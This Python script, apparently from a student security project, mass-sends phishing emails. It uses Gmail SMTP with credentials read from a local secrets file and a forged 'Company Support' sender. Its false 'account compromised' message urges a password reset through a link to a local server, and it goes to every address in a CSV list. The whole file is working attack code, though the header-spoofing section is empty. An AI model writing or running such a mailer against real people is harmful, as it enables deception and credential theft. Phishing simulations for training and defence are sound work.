#Script that sends a spoofing email to the user with the phishing link from email_generator

import csv
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

# Read sender email and password from a secrets file
with open('/Users/raresnitu/Documents/security_project/secrets.txt', 'r') as f:
    sender_email, app_password = f.read().strip().split(",")
#print(sender_email, app_password)

# Create the email message and hide the real sender
msg = MIMEMultipart()
msg["From"] = "Company Support <support@company.com>"
msg["Subject"] = "Your account has been compromised"
text = MIMEText("Your account has been compromised. Please click on the link below to reset your password. http://127.0.0.1:8001/")
msg.attach(text)

# Modify the email headers to spoof the sender address





# Read the email database
with open('/Users/raresnitu/Documents/security_project/ELEC0138_Project/phishing_attack/email_db.csv', 'r') as f:
    reader = csv.reader(f)
    next(reader)
    for row in reader:
        msg["To"] = row[1]
        s = smtplib.SMTP('smtp.gmail.com', 587)
        s.starttls()
        s.login(sender_email, app_password)
        s.sendmail(sender_email, row[1], msg.as_string())
        s.quit()
print("Emails sent")





                
